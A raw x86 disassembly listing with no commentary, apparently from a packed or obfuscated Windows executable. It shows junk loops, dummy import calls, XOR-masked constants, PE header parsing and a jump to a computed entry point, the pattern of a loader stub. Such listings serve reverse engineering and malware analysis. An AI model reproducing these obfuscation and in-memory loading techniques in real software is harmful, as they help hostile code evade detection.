  4055ac:	call   DWORD PTR ds:0x4278fb
  4055b2:	mov    eax,ds:0x42759c
  4055b7:	dec    eax
  4055b8:	mov    ds:0x42759c,eax
  4055bd:	jmp    0x405575
  4055c2:	xor    DWORD PTR ds:0x427d0b,edx
  4055c8:	mov    eax,DWORD PTR [ebp-0x18]
  4055cb:	mov    edx,DWORD PTR ds:0x4092b0
  4055d1:	mov    DWORD PTR ds:0x4275a8,0x6b2
  4055db:	xor    eax,esi
  4055dd:	add    eax,ebx
  4055df:	mov    DWORD PTR ds:0x4292d1,0x50ae
  4055e9:	cmp    edx,eax
  4055eb:	mov    DWORD PTR ds:0x4292d1,0x1218
  4055f5:	jne    0x405ffd
  4055fb:	and    DWORD PTR ds:0x427d17,0x0
  405605:	mov    eax,ds:0x427d17
  40560a:	inc    eax
  40560b:	mov    ds:0x427d17,eax
  405610:	cmp    DWORD PTR ds:0x427d17,0x7
  405617:	jne    0x40562d
  40561d:	push   0x4275e0
  405622:	push   0x400000
  405627:	call   DWORD PTR ds:0x427aa7
  40562d:	cmp    DWORD PTR ds:0x427d17,0x6
  405634:	jne    0x405645
  40563a:	mov    eax,ds:0x427d17
  40563f:	inc    eax
  405640:	mov    ds:0x427d17,eax
  405645:	cmp    DWORD PTR ds:0x427d17,0x15
  40564c:	jb     0x405605
  405652:	mov    eax,DWORD PTR [ebp-0x18]
  405655:	mov    DWORD PTR [ebp-0x30],eax
  405658:	and    DWORD PTR ds:0x4275ac,0x0
  405662:	jmp    0x405672
  405667:	mov    eax,ds:0x4275ac
  40566c:	inc    eax
  40566d:	mov    ds:0x4275ac,eax
  405672:	cmp    DWORD PTR ds:0x4275ac,0x12
  405679:	jae    0x40570b
  40567f:	cmp    DWORD PTR ds:0x4275ac,0x5
  405686:	jne    0x40569c
  40568c:	push   0x8a4f
  405691:	push   0x1ced
  405696:	call   DWORD PTR ds:0x427aab
  40569c:	cmp    DWORD PTR ds:0x4275ac,0x4
  4056a3:	jne    0x4056b7
  4056a9:	xor    eax,eax
  4056ab:	xor    eax,DWORD PTR ds:0x4275ac
  4056b1:	inc    eax
  4056b2:	mov    ds:0x4275ac,eax
  4056b7:	jmp    0x405667
  4056bc:	mov    DWORD PTR ds:0x4275a8,0x1a
  4056c6:	cmp    DWORD PTR ds:0x4275a8,0x0
  4056cd:	je     0x40570b
  4056d3:	cmp    DWORD PTR ds:0x4275a8,0x24
  4056da:	jne    0x4056f5
  4056e0:	push   0x8e07
  4056e5:	push   0x4292a5
  4056ea:	push   0x400000
  4056ef:	call   DWORD PTR ds:0x4279db
  4056f5:	mov    eax,ds:0x4275a8
  4056fa:	dec    eax
  4056fb:	mov    ds:0x4275a8,eax
  405700:	jmp    0x4056c6
  405705:	neg    DWORD PTR ds:0x42c89e
  40570b:	mov    eax,DWORD PTR [ebp-0x20]
  40570e:	add    edx,0x3568
  405714:	mov    DWORD PTR [ebp-0x1c],eax
  405717:	xor    eax,eax
  405719:	add    eax,DWORD PTR ds:0x4278bb
  40571f:	mov    edi,DWORD PTR ds:0x4278bf
  405725:	sub    eax,edi
  405727:	add    eax,DWORD PTR [eax+edi*1]
  40572a:	mov    eax,ds:0x4091a0
  40572f:	or     DWORD PTR ds:0x427d1f,ecx
  405735:	mov    eax,DWORD PTR [eax+0x198]
  40573b:	sub    edx,DWORD PTR ds:0x4292b5
  405741:	mov    DWORD PTR [ebp-0xc],eax
  405744:	mov    eax,DWORD PTR [ebp-0x1c]
  405747:	mov    edx,DWORD PTR [ebp-0xc]
  40574a:	or     DWORD PTR ds:0x427594,ebx
  405750:	xor    eax,esi
  405752:	sbb    edi,0x2806
  405758:	add    eax,ebx
  40575a:	xor    edi,0x222f
  405760:	mov    DWORD PTR [edx],eax
  405762:	and    DWORD PTR ds:0x42c89e,0x0
  40576c:	jmp    0x40577e
  405771:	mov    edx,DWORD PTR ds:0x42c89e
  405777:	inc    edx
  405778:	mov    DWORD PTR ds:0x42c89e,edx
  40577e:	cmp    DWORD PTR ds:0x42c89e,0x1b
  405785:	jae    0x4057c4
  40578b:	cmp    DWORD PTR ds:0x42c89e,0x4
  405792:	jne    0x4057a3
  405798:	push   0x755f
  40579d:	call   DWORD PTR ds:0x4279df
  4057a3:	cmp    DWORD PTR ds:0x42c89e,0x3
  4057aa:	jne    0x4057bf
  4057b0:	xor    edx,edx
  4057b2:	or     edx,DWORD PTR ds:0x42c89e
  4057b8:	inc    edx
  4057b9:	mov    DWORD PTR ds:0x42c89e,edx
  4057bf:	jmp    0x405771
  4057c4:	lea    eax,[ebp-0x14]
  4057c7:	mov    DWORD PTR [ebp-0x44],eax
  4057ca:	and    DWORD PTR ds:0x4275a4,0x0
  4057d4:	jmp    0x4057e6
  4057d9:	mov    edx,DWORD PTR ds:0x4275a4
  4057df:	inc    edx
  4057e0:	mov    DWORD PTR ds:0x4275a4,edx
  4057e6:	cmp    DWORD PTR ds:0x4275a4,0x1c
  4057ed:	jae    0x40582a
  4057f3:	cmp    DWORD PTR ds:0x4275a4,0x11
  4057fa:	jne    0x40580b
  405800:	push   0x864b
  405805:	call   DWORD PTR ds:0x4279e3
  40580b:	cmp    DWORD PTR ds:0x4275a4,0x10
  405812:	jne    0x405825
  405818:	mov    edx,DWORD PTR ds:0x4275a4
  40581e:	inc    edx
  40581f:	mov    DWORD PTR ds:0x4275a4,edx
  405825:	jmp    0x4057d9
  40582a:	mov    eax,DWORD PTR [ebp-0x1c]
  40582d:	mov    edx,DWORD PTR [ebp-0x44]
  405830:	xor    eax,esi
  405832:	or     DWORD PTR ds:0x4275a0,edx
  405838:	add    eax,ebx
  40583a:	adc    DWORD PTR ds:0x4275a4,0x37fa
  405844:	mov    DWORD PTR [edx],eax
  405846:	and    DWORD PTR ds:0x4292c9,edi
  40584c:	mov    DWORD PTR [ebp-0x54],ecx
  40584f:	lea    eax,[ebp-0x54]
  405852:	or     edi,edi
  405854:	mov    DWORD PTR [ebp-0x10],eax
  405857:	mov    edi,DWORD PTR ds:0x4292b1
  40585d:	or     edi,DWORD PTR ds:0x4275a8
  405863:	mov    DWORD PTR ds:0x4292b1,edi
  405869:	mov    eax,DWORD PTR [ebp-0x54]
  40586c:	mov    DWORD PTR ds:0x4292a1,0x1d
  405876:	cmp    DWORD PTR ds:0x4292a1,0x0
  40587d:	je     0x4058ca
  405883:	cmp    DWORD PTR ds:0x4292a1,0xb
  40588a:	jne    0x40589c
  405890:	push   DWORD PTR [ebp-0x24]
  405893:	push   DWORD PTR [ebp-0x14]
  405896:	call   DWORD PTR ds:0x427aaf
  40589c:	cmp    DWORD PTR ds:0x4292a1,0xc
  4058a3:	jne    0x4058b6
  4058a9:	mov    ecx,DWORD PTR ds:0x4292a1
  4058af:	dec    ecx
  4058b0:	mov    DWORD PTR ds:0x4292a1,ecx
  4058b6:	xor    ecx,ecx
  4058b8:	xor    ecx,DWORD PTR ds:0x4292a1
  4058be:	dec    ecx
  4058bf:	mov    DWORD PTR ds:0x4292a1,ecx
  4058c5:	jmp    0x405876
  4058ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4058cd:	or     DWORD PTR ds:0x427d0f,0x2cf9
  4058d7:	xor    eax,esi
  4058d9:	mov    edi,DWORD PTR ds:0x427d07
  4058df:	or     DWORD PTR ds:0x4292b9,edi
  4058e5:	add    eax,0x32729e
  4058ea:	mov    DWORD PTR [ecx],eax
  4058ec:	sub    edi,edi
  4058ee:	mov    eax,ds:0x409274
  4058f3:	sbb    DWORD PTR ds:0x42c882,0x4292dd
  4058fd:	mov    DWORD PTR [ebp-0x28],0x8e12febe
  405904:	sbb    DWORD PTR ds:0x427d0f,0x4292d5
  40590e:	mov    eax,DWORD PTR [eax]
  405910:	mov    cx,WORD PTR [ebp-0x14]
  405914:	movzx  edi,WORD PTR ds:0x4292dd
  40591b:	and    DWORD PTR ds:0x4292d9,edi
  405921:	movzx  ecx,cx
  405924:	add    DWORD PTR ds:0x4275b0,0x4292b5
  40592e:	add    ecx,DWORD PTR [eax]
  405930:	or     edi,edi
  405932:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  405939:	mov    DWORD PTR [ebp-0x10],ecx
  40593c:	sub    ecx,DWORD PTR ds:0x4292c1
  405942:	mov    edi,0x5a3fc9e
  405947:	mov    eax,DWORD PTR [ebp-0x1c]
  40594a:	mov    DWORD PTR ds:0x427d1b,0x10
  405954:	cmp    DWORD PTR ds:0x427d1b,0x0
  40595b:	je     0x4059b1
  405961:	cmp    DWORD PTR ds:0x427d1b,0x6
  405968:	jne    0x405983
  40596e:	push   0x1942
  405973:	push   0x427d03
  405978:	push   0x427644
  40597d:	call   DWORD PTR ds:0x427ab3
  405983:	cmp    DWORD PTR ds:0x427d1b,0x7
  40598a:	jne    0x40599f
  405990:	xor    ecx,ecx
  405992:	xor    ecx,DWORD PTR ds:0x427d1b
  405998:	dec    ecx
  405999:	mov    DWORD PTR ds:0x427d1b,ecx
  40599f:	mov    ecx,DWORD PTR ds:0x427d1b
  4059a5:	dec    ecx
  4059a6:	mov    DWORD PTR ds:0x427d1b,ecx
  4059ac:	jmp    0x405954
  4059b1:	mov    ecx,DWORD PTR [ebp-0xc]
  4059b4:	xor    eax,esi
  4059b6:	or     DWORD PTR ds:0x4292cd,0x78e6
  4059c0:	add    eax,ebx
  4059c2:	mov    DWORD PTR ds:0x4292b1,0x5c9d
  4059cc:	cmp    DWORD PTR [ecx],eax
  4059ce:	jne    0x405c08
  4059d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4059d7:	xor    ecx,DWORD PTR ds:0x4292c1
  4059dd:	mov    ecx,DWORD PTR [ebp-0x10]
  4059e0:	xor    eax,esi
  4059e2:	add    eax,ebx
  4059e4:	mov    DWORD PTR ds:0x4275a4,0x5c09
  4059ee:	cmp    DWORD PTR [ecx],eax
  4059f0:	mov    DWORD PTR ds:0x4275b0,0x35e5
  4059fa:	jne    0x405ad7
  405a00:	mov    eax,DWORD PTR [ebp-0x1c]
  405a03:	mov    ecx,DWORD PTR [ebp-0x44]
  405a06:	xor    eax,esi
  405a08:	add    eax,ebx
  405a0a:	mov    DWORD PTR [ecx],eax
  405a0c:	and    DWORD PTR ds:0x42c886,0x0
  405a16:	jmp    0x405a28
  405a1b:	mov    edx,DWORD PTR ds:0x42c886
  405a21:	inc    edx
  405a22:	mov    DWORD PTR ds:0x42c886,edx
  405a28:	cmp    DWORD PTR ds:0x42c886,0x1e
  405a2f:	jae    0x405ab0
  405a35:	cmp    DWORD PTR ds:0x42c886,0x2b
  405a3c:	jne    0x405a4d
  405a42:	push   0x2523
  405a47:	call   DWORD PTR ds:0x427ab7
  405a4d:	jmp    0x405a1b
  405a52:	and    DWORD PTR ds:0x4292b5,0x0
  405a5c:	xor    edx,edx
  405a5e:	xor    edx,DWORD PTR ds:0x4292b5
  405a64:	inc    edx
  405a65:	mov    DWORD PTR ds:0x4292b5,edx
  405a6b:	cmp    DWORD PTR ds:0x4292b5,0xe
  405a72:	jne    0x405a83
  405a78:	push   0x3988
  405a7d:	call   DWORD PTR ds:0x4279e7
  405a83:	cmp    DWORD PTR ds:0x4292b5,0xd
  405a8a:	jne    0x405a9d
  405a90:	mov    edx,DWORD PTR ds:0x4292b5
  405a96:	inc    edx
  405a97:	mov    DWORD PTR ds:0x4292b5,edx
  405a9d:	cmp    DWORD PTR ds:0x4292b5,0x19
  405aa4:	jb     0x405a5c
  405aaa:	sbb    DWORD PTR ds:0x4292c9,ebx
  405ab0:	mov    eax,DWORD PTR [ebp-0x44]
  405ab3:	mov    ecx,DWORD PTR [ebp-0x34]
  405ab6:	xor    ecx,esi
  405ab8:	sub    edx,DWORD PTR ds:0x4292ad
  405abe:	mov    edx,0xffcd8d62
  405ac3:	sub    DWORD PTR ds:0x427cf7,0x427d0f
  405acd:	sub    edx,ecx
  405acf:	not    DWORD PTR ds:0x4292ad
  405ad5:	add    DWORD PTR [eax],edx
  405ad7:	and    DWORD PTR ds:0x4292ad,0x0
  405ae1:	mov    eax,ds:0x4292ad
  405ae6:	inc    eax
  405ae7:	mov    ds:0x4292ad,eax
  405aec:	cmp    DWORD PTR ds:0x4292ad,0x26
  405af3:	jne    0x405b19
  405af9:	push   DWORD PTR [ebp-0x28]
  405afc:	push   0x26cd
  405b01:	push   0x51bd
  405b06:	push   0x1327
  405b0b:	push   0x7353
  405b10:	push   DWORD PTR [ebp-0x1c]
  405b13:	call   DWORD PTR ds:0x4279eb
  405b19:	cmp    DWORD PTR ds:0x4292ad,0x16
  405b20:	jb     0x405ae1
  405b26:	mov    eax,ds:0x409274
  405b2b:	mov    eax,DWORD PTR [eax]
  405b2d:	mov    cx,WORD PTR [ebp-0x14]
  405b31:	movzx  ecx,cx
  405b34:	adc    DWORD PTR ds:0x4292a9,0x4292d1
  405b3e:	add    ecx,DWORD PTR [eax]
  405b40:	mov    DWORD PTR [ebp-0x10],ecx
  405b43:	mov    eax,ds:0x42c892
  405b48:	adc    DWORD PTR ds:0x42c89a,eax
  405b4e:	mov    eax,DWORD PTR [ebp-0x30]
  405b51:	sbb    ecx,DWORD PTR ds:0x4292b9
  405b57:	mov    ecx,DWORD PTR [ebp-0x30]
  405b5a:	or     DWORD PTR ds:0x42c88a,0x6b1f
  405b64:	xor    eax,esi
  405b66:	lea    eax,[eax+eax*1+0x32729e]
  405b6d:	adc    DWORD PTR ds:0x42759c,0x427d07
  405b77:	xor    ecx,esi
  405b79:	sub    ecx,eax
  405b7b:	mov    DWORD PTR ds:0x4275b0,0x4a7
  405b85:	mov    ax,WORD PTR [ebp-0x14]
  405b89:	mov    DWORD PTR ds:0x42c88e,0x21d5
  405b93:	movzx  eax,ax
  405b96:	mov    DWORD PTR ds:0x4292b9,0x441f
  405ba0:	cmp    eax,ecx
  405ba2:	mov    ecx,0x2c38
  405ba7:	mov    eax,DWORD PTR [ebp-0x34]
  405baa:	movzx  ecx,WORD PTR [ebp-0x14]
  405bae:	jg     0x405beb
  405bb4:	or     DWORD PTR ds:0x42c88e,0x6341
  405bbe:	xor    eax,esi
  405bc0:	sbb    DWORD PTR ds:0x427d13,0x4292bd
  405bca:	sub    ecx,eax
  405bcc:	sbb    DWORD PTR ds:0x4292a9,0x68
  405bd6:	sub    ecx,ebx
  405bd8:	mov    DWORD PTR ds:0x4292b5,0x7dde
  405be2:	mov    WORD PTR [ebp-0x14],cx
  405be6:	jmp    0x405c08
  405beb:	xor    eax,esi
  405bed:	mov    DWORD PTR ds:0x4292c1,0x28f0
  405bf7:	lea    eax,[eax+ecx*1+0x32729e]
  405bfe:	mov    DWORD PTR ds:0x4275a4,ecx
  405c04:	mov    WORD PTR [ebp-0x14],ax
  405c08:	mov    ecx,DWORD PTR [ebp-0x28]
  405c0b:	mov    eax,ds:0x427594
  405c10:	mov    eax,0x8e12febe
  405c15:	cmp    ecx,eax
  405c17:	je     0x405c41
  405c1d:	not    eax
  405c1f:	mov    eax,DWORD PTR [ebp-0xc]
  405c22:	mov    DWORD PTR ds:0x427598,0x90
  405c2c:	mov    DWORD PTR [eax],0x60341e8d
  405c32:	mov    DWORD PTR ds:0x427cfb,0xcef
  405c3c:	jmp    0x405fec
  405c41:	mov    DWORD PTR ds:0x427cfb,ecx
  405c47:	mov    ecx,DWORD PTR [ebp-0x28]
  405c4a:	mov    DWORD PTR ds:0x4275a8,0x60ce
  405c54:	cmp    ecx,0x5142ddbc
  405c5a:	mov    DWORD PTR ds:0x4292d5,0x22e7
  405c64:	jne    0x405dd1
  405c6a:	not    eax
  405c6c:	mov    eax,DWORD PTR [ebp-0xc]
  405c6f:	mov    DWORD PTR [eax],0x4214febc
  405c75:	mov    eax,DWORD PTR [ebp-0xc]
  405c78:	mov    DWORD PTR ds:0x42c89e,0x9bc
  405c82:	mov    DWORD PTR [ebp-0x4],eax
  405c85:	mov    eax,DWORD PTR [ebp-0x30]
  405c88:	mov    DWORD PTR ds:0x4292bd,ebx
  405c8e:	mov    eax,DWORD PTR [ebp-0x1c]
  405c91:	mov    eax,0x59e1
  405c96:	mov    DWORD PTR [ebp-0x4c],edi
  405c99:	mov    eax,DWORD PTR [ebp-0x4c]
  405c9c:	mov    DWORD PTR ds:0x4292d1,0x6603
  405ca6:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405cad:	mov    DWORD PTR ds:0x42c89e,0x4b8d
  405cb7:	cmp    eax,edi
  405cb9:	jne    0x405fec
  405cbf:	mov    ax,WORD PTR [ebp-0x8]
  405cc3:	and    DWORD PTR ds:0x4292c9,0x0
  405ccd:	mov    ecx,DWORD PTR ds:0x4292c9
  405cd3:	inc    ecx
  405cd4:	mov    DWORD PTR ds:0x4292c9,ecx
  405cda:	cmp    DWORD PTR ds:0x4292c9,0x7
  405ce1:	jne    0x405d0a
  405ce7:	push   0x3aec
  405cec:	push   0x6e2f
  405cf1:	push   0x3209
  405cf6:	push   0x4292c9
  405cfb:	push   DWORD PTR [ebp-0x20]
  405cfe:	push   DWORD PTR [ebp-0x28]
  405d01:	push   DWORD PTR [ebp-0x14]
  405d04:	call   DWORD PTR ds:0x427abb
  405d0a:	cmp    DWORD PTR ds:0x4292c9,0x6
  405d11:	jne    0x405d24
  405d17:	mov    ecx,DWORD PTR ds:0x4292c9
  405d1d:	inc    ecx
  405d1e:	mov    DWORD PTR ds:0x4292c9,ecx
  405d24:	cmp    DWORD PTR ds:0x4292c9,0x1a
  405d2b:	jb     0x405ccd
  405d31:	mov    ecx,0x8a42
  405d36:	and    DWORD PTR ds:0x427598,0x7f75
  405d40:	xor    ax,cx
  405d43:	mov    ecx,DWORD PTR ds:0x427594
  405d49:	xor    DWORD PTR ds:0x4292c9,ecx
  405d4f:	mov    ecx,0x3b08
  405d54:	add    ax,cx
  405d57:	mov    ecx,DWORD PTR [ebp-0x4]
  405d5a:	movzx  eax,ax
  405d5d:	sub    DWORD PTR ds:0x4292dd,0x42c892
  405d67:	not    eax
  405d69:	add    DWORD PTR ds:0x42c88a,0x427d03
  405d73:	and    eax,DWORD PTR [ecx]
  405d75:	mov    DWORD PTR ds:0x42c886,0x6891
  405d7f:	mov    ecx,DWORD PTR [ebp-0x4]
  405d82:	mov    DWORD PTR ds:0x4275ac,0x5963
  405d8c:	mov    DWORD PTR [ecx],eax
  405d8e:	jmp    0x405d9a
  405d93:	xor    DWORD PTR [ebp-0x4c],0xe149ebe
  405d9a:	xor    DWORD PTR ds:0x427d1b,0x1156
  405da4:	mov    ax,WORD PTR [ebp-0x8]
  405da8:	push   DWORD PTR [ebp-0x4]
  405dab:	call   0x401000
  405db0:	test   eax,eax
  405db2:	mov    DWORD PTR ds:0x4292d9,0x68ee
  405dbc:	je     0x405d93
  405dc2:	mov    DWORD PTR ds:0x4292b1,0x2e0e
  405dcc:	jmp    0x405fec
  405dd1:	mov    ecx,DWORD PTR [ebp-0x28]
  405dd4:	cmp    ecx,0x1443fcbd
  405dda:	mov    DWORD PTR ds:0x427598,0x1afd
  405de4:	jne    0x405e02
  405dea:	mov    eax,DWORD PTR [ebp-0xc]
  405ded:	mov    DWORD PTR ds:0x4292b9,0x35a9
  405df7:	mov    DWORD PTR [eax],0x60062d8f
  405dfd:	jmp    0x405fec
  405e02:	mov    ecx,DWORD PTR [ebp-0x28]
  405e05:	cmp    ecx,eax
  405e07:	mov    DWORD PTR ds:0x42c88a,0x2673
  405e11:	jne    0x405f71
  405e17:	and    DWORD PTR ds:0x427cff,0x0
  405e21:	xor    eax,eax
  405e23:	or     eax,DWORD PTR ds:0x427cff
  405e29:	inc    eax
  405e2a:	mov    ds:0x427cff,eax
  405e2f:	cmp    DWORD PTR ds:0x427cff,0xc
  405e36:	jne    0x405e47
  405e3c:	push   0x4d1d
  405e41:	call   DWORD PTR ds:0x427abf
  405e47:	cmp    DWORD PTR ds:0x427cff,0xb
  405e4e:	jne    0x405e62
  405e54:	xor    eax,eax
  405e56:	or     eax,DWORD PTR ds:0x427cff
  405e5c:	inc    eax
  405e5d:	mov    ds:0x427cff,eax
  405e62:	cmp    DWORD PTR ds:0x427cff,0x1f
  405e69:	jb     0x405e21
  405e6f:	mov    eax,DWORD PTR [ebp-0x1c]
  405e72:	mov    ecx,DWORD PTR [ebp-0xc]
  405e75:	xor    eax,esi
  405e77:	add    eax,ebx
  405e79:	cmp    DWORD PTR [ecx],eax
  405e7b:	je     0x405efe
  405e81:	mov    ecx,DWORD PTR [ebp-0x54]
  405e84:	mov    eax,DWORD PTR [ebp-0xc]
  405e87:	mov    eax,DWORD PTR [eax]
  405e89:	mov    eax,DWORD PTR [eax+0x3c]
  405e8c:	lea    ecx,[ecx*8+0x78]
  405e93:	add    eax,ecx
  405e95:	mov    ecx,DWORD PTR [ebp-0xc]
  405e98:	mov    ecx,DWORD PTR [ecx]
  405e9a:	mov    eax,DWORD PTR [eax+ecx*1]
  405e9d:	mov    DWORD PTR [ebp-0x8],eax
  405ea0:	mov    eax,DWORD PTR [ebp-0x1c]
  405ea3:	xor    eax,esi
  405ea5:	add    eax,ebx
  405ea7:	mov    DWORD PTR [ebp-0x4],eax
  405eaa:	mov    eax,DWORD PTR [ebp-0x1c]
  405ead:	mov    ecx,DWORD PTR [ebp-0x8]
  405eb0:	xor    eax,esi
  405eb2:	add    eax,ebx
  405eb4:	cmp    ecx,eax
  405eb6:	je     0x405fec
  405ebc:	mov    eax,DWORD PTR [ebp-0xc]
  405ebf:	mov    ecx,DWORD PTR [ebp-0x8]
  405ec2:	add    ecx,DWORD PTR [eax]
  405ec4:	mov    DWORD PTR [ebp-0x4],ecx
  405ec7:	mov    eax,DWORD PTR [ebp-0x4]
  405eca:	mov    ecx,DWORD PTR [ebp-0xc]
  405ecd:	mov    eax,DWORD PTR [eax+0xc]
  405ed0:	mov    ecx,DWORD PTR [ecx]
  405ed2:	mov    al,BYTE PTR [eax+ecx*1]
  405ed5:	add    al,0x35
  405ed7:	xor    al,0x49
  405ed9:	cmp    al,0xc9
  405edb:	je     0x405ef2
  405ee1:	mov    eax,DWORD PTR [ebp-0x1c]
  405ee4:	mov    ecx,DWORD PTR [ebp-0xc]
  405ee7:	xor    eax,esi
  405ee9:	add    eax,ebx
  405eeb:	mov    DWORD PTR [ecx],eax
  405eed:	jmp    0x405fec
  405ef2:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  405ef9:	jmp    0x405fec
  405efe:	mov    eax,DWORD PTR [ebp-0xc]
  405f01:	mov    ecx,DWORD PTR [ebp-0x10]
  405f04:	mov    ecx,DWORD PTR [ecx]
  405f06:	mov    DWORD PTR [eax],ecx
  405f08:	mov    eax,DWORD PTR [ebp-0xc]
  405f0b:	mov    DWORD PTR [ebp-0x4],eax
  405f0e:	mov    eax,DWORD PTR [ebp-0x30]
  405f11:	mov    eax,DWORD PTR [ebp-0x1c]
  405f14:	mov    DWORD PTR [ebp-0x5c],edi
  405f17:	mov    eax,DWORD PTR [ebp-0x5c]
  405f1a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405f21:	cmp    eax,edi
  405f23:	jne    0x405fec
  405f29:	mov    ax,WORD PTR [ebp-0x8]
  405f2d:	mov    ecx,0x8a42
  405f32:	xor    ax,cx
  405f35:	mov    ecx,0x3b08
  405f3a:	add    ax,cx
  405f3d:	mov    ecx,DWORD PTR [ebp-0x4]
  405f40:	movzx  eax,ax
  405f43:	not    eax
  405f45:	and    eax,DWORD PTR [ecx]
  405f47:	mov    ecx,DWORD PTR [ebp-0x4]
  405f4a:	mov    DWORD PTR [ecx],eax
  405f4c:	jmp    0x405f58
  405f51:	xor    DWORD PTR [ebp-0x5c],0xe149ebe
  405f58:	mov    ax,WORD PTR [ebp-0x8]
  405f5c:	push   DWORD PTR [ebp-0x4]
  405f5f:	call   0x401000
  405f64:	test   eax,eax
  405f66:	je     0x405f51
  405f6c:	jmp    0x405fec
  405f71:	mov    eax,DWORD PTR [ebp-0x28]
  405f74:	cmp    eax,0x33450cad
  405f79:	jne    0x405fec
  405f7f:	mov    eax,DWORD PTR [ebp-0xc]
  405f82:	mov    DWORD PTR [eax],0x443dc9d
  405f88:	mov    eax,DWORD PTR [ebp-0xc]
  405f8b:	mov    DWORD PTR [ebp-0x4],eax
  405f8e:	mov    eax,DWORD PTR [ebp-0x30]
  405f91:	mov    eax,DWORD PTR [ebp-0x1c]
  405f94:	mov    DWORD PTR [ebp-0x40],edi
  405f97:	mov    eax,DWORD PTR [ebp-0x40]
  405f9a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405fa1:	cmp    eax,edi
  405fa3:	jne    0x405fec
  405fa9:	mov    ax,WORD PTR [ebp-0x8]
  405fad:	mov    ecx,0x8a42
  405fb2:	xor    ax,cx
  405fb5:	mov    ecx,0x3b08
  405fba:	add    ax,cx
  405fbd:	mov    ecx,DWORD PTR [ebp-0x4]
  405fc0:	movzx  eax,ax
  405fc3:	not    eax
  405fc5:	and    eax,DWORD PTR [ecx]
  405fc7:	mov    ecx,DWORD PTR [ebp-0x4]
  405fca:	mov    DWORD PTR [ecx],eax
  405fcc:	jmp    0x405fd8
  405fd1:	xor    DWORD PTR [ebp-0x40],0xe149ebe
  405fd8:	mov    ax,WORD PTR [ebp-0x8]
  405fdc:	push   DWORD PTR [ebp-0x4]
  405fdf:	call   0x401000
  405fe4:	test   eax,eax
  405fe6:	je     0x405fd1
  405fec:	mov    eax,DWORD PTR [ebp-0x28]
  405fef:	cmp    eax,0x8e12febe
  405ff4:	je     0x405947
  405ffa:	mov    eax,DWORD PTR [ebp-0xc]
  405ffd:	mov    eax,ds:0x4091a0
  406002:	mov    eax,DWORD PTR [eax+0x18c]
  406008:	mov    eax,DWORD PTR [eax]
  40600a:	mov    DWORD PTR [ebp-0x74],eax
  40600d:	mov    eax,0xf89c8531
  406012:	mov    DWORD PTR [ebp-0x10],eax
  406015:	mov    DWORD PTR [ebp-0x10],eax
  406018:	mov    DWORD PTR [ebp-0x10],eax
  40601b:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  406022:	mov    DWORD PTR [ebp-0x8],eax
  406025:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  40602c:	mov    edi,DWORD PTR [ebp-0x20]
  40602f:	xor    edi,esi
  406031:	add    edi,ebx
  406033:	jmp    0x40606e
  406038:	mov    eax,DWORD PTR [ebp-0x18]
  40603b:	xor    eax,esi
  40603d:	lea    eax,[eax+edi*1+0x32729e]
  406044:	push   eax
  406045:	mov    eax,DWORD PTR [ebp-0x10]
  406048:	xor    eax,esi
  40604a:	lea    eax,[ebp+eax*1+0x3272a6]
  406051:	push   eax
  406052:	mov    eax,ds:0x4091a0
  406057:	push   DWORD PTR [eax+0x1bc]
  40605d:	call   0x402c87
  406062:	mov    eax,DWORD PTR [ebp-0x18]
  406065:	xor    eax,esi
  406067:	lea    edi,[edi+eax*1+0x32729e]
  40606e:	mov    eax,DWORD PTR [ebp-0x18]
  406071:	mov    ecx,DWORD PTR [ebp-0x18]
  406074:	xor    ecx,esi
  406076:	xor    eax,esi
  406078:	add    eax,ecx
  40607a:	mov    ecx,DWORD PTR [ebp-0x18]
  40607d:	xor    ecx,esi
  40607f:	lea    eax,[eax+ecx*1+0x9757da]
  406086:	cmp    edi,eax
  406088:	jbe    0x406038
  40608e:	mov    eax,DWORD PTR [ebp+0xc]
  406091:	mov    ds:0x409024,eax
  406096:	mov    eax,DWORD PTR [ebp+0x10]
  406099:	mov    ds:0x409278,eax
  40609e:	mov    eax,ds:0x409024
  4060a3:	mov    ecx,DWORD PTR [ebp-0x60]
  4060a6:	sub    eax,ebx
  4060a8:	xor    eax,esi
  4060aa:	mov    DWORD PTR [ecx],eax
  4060ac:	mov    eax,DWORD PTR [ebp-0x58]
  4060af:	cmp    eax,0xf89c8534
  4060b4:	je     0x406111
  4060ba:	mov    eax,DWORD PTR [ebp-0x20]
  4060bd:	mov    ecx,DWORD PTR [ebp-0x50]
  4060c0:	xor    eax,esi
  4060c2:	add    eax,ebx
  4060c4:	cmp    eax,ecx
  4060c6:	je     0x406111
  4060cc:	mov    eax,ds:0x4091a0
  4060d1:	mov    eax,DWORD PTR [eax+0x194]
  4060d7:	mov    ecx,DWORD PTR [eax]
  4060d9:	mov    eax,DWORD PTR [ecx+0x3c]
  4060dc:	push   DWORD PTR ds:0x409278
  4060e2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4060e6:	push   DWORD PTR ds:0x409024
  4060ec:	add    eax,ecx
  4060ee:	mov    ecx,DWORD PTR ds:0x4091a0
  4060f4:	mov    ecx,DWORD PTR [ecx+0x194]
  4060fa:	push   DWORD PTR [ecx]
  4060fc:	call   eax
  4060fe:	mov    ecx,DWORD PTR ds:0x4091a0
  406104:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40610a:	mov    DWORD PTR [ecx],eax
  40610c:	jmp    0x4063cb
  406111:	mov    eax,DWORD PTR [ebp-0x20]
  406114:	mov    ecx,DWORD PTR [ebp-0x74]
  406117:	xor    eax,esi
  406119:	add    eax,ebx
  40611b:	mov    edi,0xf89c85f5
  406120:	cmp    eax,ecx
  406122:	jne    0x406223
  406128:	mov    eax,DWORD PTR [ebp-0x20]
  40612b:	xor    eax,esi
  40612d:	add    eax,ebx
  40612f:	mov    ds:0x409224,eax
  406134:	mov    eax,DWORD PTR [ebp-0x20]
  406137:	xor    eax,esi
  406139:	add    eax,ebx
  40613b:	mov    ds:0x40921c,eax
  406140:	mov    eax,DWORD PTR [ebp-0x18]
  406143:	mov    DWORD PTR [ebp-0x8],eax
  406146:	mov    eax,DWORD PTR [ebp-0x20]
  406149:	mov    DWORD PTR [ebp+0xc],eax
  40614c:	mov    eax,DWORD PTR [ebp+0xc]
  40614f:	xor    eax,esi
  406151:	add    eax,ebx
  406153:	mov    DWORD PTR [ebp+0xc],eax
